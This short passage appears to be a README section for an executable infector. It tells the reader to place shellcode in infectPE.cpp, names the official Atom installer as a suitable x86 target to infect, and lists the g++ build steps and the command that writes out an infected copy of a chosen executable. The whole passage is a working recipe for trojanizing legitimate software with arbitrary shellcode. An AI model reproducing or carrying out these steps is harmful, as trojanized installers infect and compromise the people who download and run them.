### Infect a file
Put the shellcode inside the infectPE.cpp (only accepts x86 executables). A posible option of executable file to infect is this [AtomInstaller](https://github.com/atom/atom/releases/download/v1.53.0/AtomSetup.exe)

```sh
> g++ -c PE.cpp -std=c++17
> g++ -c InfectPE.cpp -std=c++17
> g++ -o InfectPE.exe InfectPE.o PE.o
> .\InfectPE.exe .\executable_to_infect.exe .\executable_infected.exe
```